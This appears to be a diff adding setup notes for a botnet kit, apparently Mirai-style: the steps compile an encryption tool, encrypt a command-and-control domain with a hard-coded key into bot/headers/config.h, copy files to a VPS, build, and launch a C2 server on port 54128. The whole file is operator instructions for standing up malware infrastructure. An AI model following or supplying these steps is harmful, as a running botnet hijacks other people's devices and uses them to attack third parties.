@@ -1,0 +1,21 @@
+chmod 777 package.sh
+source ./package.sh
+
+!!!
+encrypt domain first
+
+cd tools
+gcc enc.c -o enc
+
+./enc encrypt "YOUR_DNS" fd00e82a0a3d86af73deacaa9df16432
+nano bot/headers/config.h << CNC_DOMAIN "HERE"
+
+get key from config.h
+
+Now drop all files to ur vps
+
+chmod 777 build.sh
+./build.sh
+
+screen ./server 54128 30 999
+
